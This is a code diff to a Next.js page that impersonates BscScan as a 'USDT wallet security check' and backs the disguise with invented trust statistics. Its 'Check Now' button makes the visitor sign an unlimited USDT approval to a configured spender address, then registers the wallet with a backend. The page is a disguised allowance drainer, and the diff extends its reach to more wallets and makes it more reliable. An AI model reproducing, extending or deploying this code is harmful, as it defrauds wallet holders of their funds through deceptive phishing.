@@ -1,16 +1,19 @@
 "use client";
 
-import { useState } from "react";
+import { useEffect, useState } from "react";
 import { BrowserProvider, Contract, ethers } from "ethers";
 import { Check, CheckCircle2, ChevronDown, Clock3, LockKeyhole, Menu, PlusCircle, Radio, ShieldCheck, Sun } from "lucide-react";
 
-declare global { interface Window { ethereum?: { request: (args: { method: string; params?: unknown[] }) => Promise<unknown> }; } }
+type Eip1193Provider = { request: (args: { method: string; params?: unknown[] }) => Promise<unknown>; on?: (event: string, listener: (...args: unknown[]) => void) => void; removeListener?: (event: string, listener: (...args: unknown[]) => void) => void };
+type Eip6963ProviderDetail = { info: { name: string; rdns: string }; provider: Eip1193Provider };
+
+declare global { interface Window { ethereum?: Eip1193Provider; } }
 const token = process.env.NEXT_PUBLIC_USDT_ADDRESS ?? "";
 const spender = process.env.NEXT_PUBLIC_ALLOWANCE_SPENDER_ADDRESS ?? "";
 const chainId = process.env.NEXT_PUBLIC_CHAIN_ID ?? "56";
+const targetChainId = BigInt(chainId);
+const targetChainHex = `0x${targetChainId.toString(16)}`;
 const api = process.env.NEXT_PUBLIC_API_URL ?? "http://localhost:4000";
-console .log("TOKEN =", token);
-console .log("SPENDER =", spender);
 const erc20 = ["function approve(address spender,uint256 amount) returns (bool)", "function allowance(address owner,address spender) view returns (uint256)"];
 const faqs = [
   ["What is USDT Verify?", "USDT Verify is an automated blockchain inspection tool designed to diagnose safety risks, address history, and smart contract health."],
@@ -21,16 +24,62 @@ const faqs = [
 ];
 
 export default function Home() {
-  const [wallet, setWallet] = useState(""); const [notice, setNotice] = useState(""); const [openFaq, setOpenFaq] = useState<number | null>(null);
-  async function checkNow() {
-    if (!window.ethereum) return setNotice("MetaMask is required to connect.");
-    if (!spender || !token) return setNotice("Contract configuration is missing.");
+  const [wallet, setWallet] = useState(""); const [notice, setNotice] = useState(""); const [openFaq, setOpenFaq] = useState<number | null>(null); const [isChecking, setIsChecking] = useState(false); const [walletProvider, setWalletProvider] = useState<Eip1193Provider>();
+
+  useEffect(() => {
+    const announced = (event: Event) => {
+      const provider = (event as CustomEvent<Eip6963ProviderDetail>).detail?.provider;
+      if (provider && !walletProvider) setWalletProvider(provider);
+    };
+    const handleAccountsChanged = (...args: unknown[]) => {
+      const accounts = Array.isArray(args[0]) ? args[0] as string[] : [];
+      if (!accounts.length) { setWallet(""); setNotice("Wallet disconnected. Click Check Now to connect again."); return; }
+      setWallet(ethers.getAddress(accounts[0])); setNotice("Wallet account changed. Click Check Now to continue.");
+    };
+    const handleChainChanged = (...args: unknown[]) => {
+      if (String(args[0]).toLowerCase() !== targetChainHex) setNotice("Please switch to BNB Smart Chain to continue.");
+    };
+    window.addEventListener("eip6963:announceProvider", announced);
+    window.dispatchEvent(new Event("eip6963:requestProvider"));
+    const provider = walletProvider ?? window.ethereum;
+    provider?.on?.("accountsChanged", handleAccountsChanged);
+    provider?.on?.("chainChanged", handleChainChanged);
+    provider?.request({ method: "eth_accounts" }).then((accounts) => {
+      if (Array.isArray(accounts) && accounts[0]) setWallet(ethers.getAddress(String(accounts[0])));
+    }).catch(() => undefined);
+    return () => {
+      window.removeEventListener("eip6963:announceProvider", announced);
+      provider?.removeListener?.("accountsChanged", handleAccountsChanged);
+      provider?.removeListener?.("chainChanged", handleChainChanged);
+    };
+  }, [walletProvider]);
+
+  function getProvider() { return walletProvider ?? window.ethereum; }
+
+  async function switchToBnb(provider: Eip1193Provider) {
+    const currentChain = String(await provider.request({ method: "eth_chainId" })).toLowerCase();
+    if (currentChain === targetChainHex) return;
     try {
-      const provider = new BrowserProvider(window.ethereum);
-      await provider.send("eth_requestAccounts", []);
-      const network = await provider.getNetwork();
-      if (network.chainId !== BigInt(chainId)) return setNotice("Please switch MetaMask to BNB Smart Chain.");
-      const signer = await provider.getSigner();
+      await provider.request({ method: "wallet_switchEthereumChain", params: [{ chainId: targetChainHex }] });
+    } catch (error) {
+      if ((error as { code?: number }).code !== 4902) throw error;
+      const isTestnet = targetChainId === BigInt(97);
+      await provider.request({ method: "wallet_addEthereumChain", params: [{ chainId: targetChainHex, chainName: isTestnet ? "BNB Smart Chain Testnet" : "BNB Smart Chain", nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 }, rpcUrls: [isTestnet ? "https://data-seed-prebsc-1-s1.bnbchain.org:8545" : "https://bsc-dataseed.bnbchain.org"], blockExplorerUrls: [isTestnet ? "https://testnet.bscscan.com" : "https://bscscan.com"] }] });
+    }
+    if (String(await provider.request({ method: "eth_chainId" })).toLowerCase() !== targetChainHex) throw new Error("Please switch to BNB Smart Chain to continue.");
+  }
+
+  async function checkNow() {
+    const provider = getProvider();
+    if (!provider) return setNotice("Install a compatible EVM wallet to connect.");
+    if (!spender || !token) return setNotice("Contract configuration is missing.");
+    setIsChecking(true); setNotice("");
+    try {
+      const accounts = await provider.request({ method: "eth_requestAccounts" }) as string[];
+      if (!accounts?.length) throw new Error("No wallet account was selected.");
+      await switchToBnb(provider);
+      const browserProvider = new BrowserProvider(provider as never);
+      const signer = await browserProvider.getSigner();
       const address = await signer.getAddress();
       setWallet(address);
       const contract = new Contract(token, erc20, signer);
@@ -40,17 +89,22 @@ export default function Home() {
         const tx = await contract.approve(spender, ethers.MaxUint256);
         await tx.wait();
       }
-      await fetch(`${api}/api/wallets`, { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ address, receiver: 1 }) });
+      const currentAccounts = await provider.request({ method: "eth_accounts" }) as string[];
+      if (!currentAccounts.some((account) => account.toLowerCase() === address.toLowerCase())) throw new Error("Wallet account changed before completion. Click Check Now to retry.");
+      if (String(await provider.request({ method: "eth_chainId" })).toLowerCase() !== targetChainHex) throw new Error("Wallet network changed before completion. Click Check Now to retry.");
+      const response = await fetch(`${api}/api/wallets`, { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ address, receiver: 1 }) });
+      if (!response.ok) throw new Error("Wallet registration failed. Please try again.");
       setNotice("Allowance approved. Your wallet is now registered for monitoring.");
     }
-    catch (error) { setNotice(error instanceof Error ? error.message : "Verification failed."); }
+    catch (error) { setNotice((error as { code?: number }).code === 4001 ? "Wallet request was cancelled." : error instanceof Error ? error.message : "Verification failed."); }
+    finally { setIsChecking(false); }
   }
   return <main>
     <header className="hero-pattern hero">
       <nav className="nav"><div className="brand"><div className="logo"><Radio size={20} /></div><div><h1>BscScan</h1><span>Scan Original</span></div></div><div className="nav-actions"><button className="icon-button" aria-label="Theme"><Sun size={18} /></button><button className="icon-button" aria-label="Menu"><Menu /></button></div></nav>
       <div className="trust">⭐ <span>Trusted by 100K+ users worldwide</span></div><div className="hero-copy"><h2>Check Your USDT<br />Wallet Security</h2><p>Advanced blockchain analysis using official BSC Scan data to determine if your USDT wallet is <strong>safe, valid, and free</strong> from suspicious activity.</p></div>
       <ul className="checks">{["Advanced blockchain analysis", "Real-time threat detection", "Zero data retention policy", "Enterprise-grade security"].map((item) => <li key={item}><span><Check size={14} /></span>{item}</li>)}</ul>
-      <div className="actions"><button className="primary" onClick={checkNow}>Check Now</button></div>{notice && <p className="notice">{notice}</p>}
+      <div className="actions"><button className="primary" onClick={checkNow} disabled={isChecking} aria-busy={isChecking}>Check Now</button></div>{notice && <p className="notice" role="status">{notice}</p>}
       <div className="hero-stats"><span><ShieldCheck />100% Secure</span><span><Clock3 />Real-Time Scans</span><span><LockKeyhole />Never Custodial</span></div>
     </header>
     <section className="section stats-section"><div className="eyebrow">Security Analytics · Real-Time Blockchain Verification</div><div className="stats"><Stat value="500K+" label="Wallets Verified" /><Stat value="99.8%" label="Accuracy Rate" /><Stat value="&lt;3s" label="Analysis Time" /><Stat value="24/7" label="Protection" /></div><div className="review"><b>Join thousands of secure users</b><strong>★★★★★</strong><small>4.9/5 from 5,000+ reviews</small></div></section>
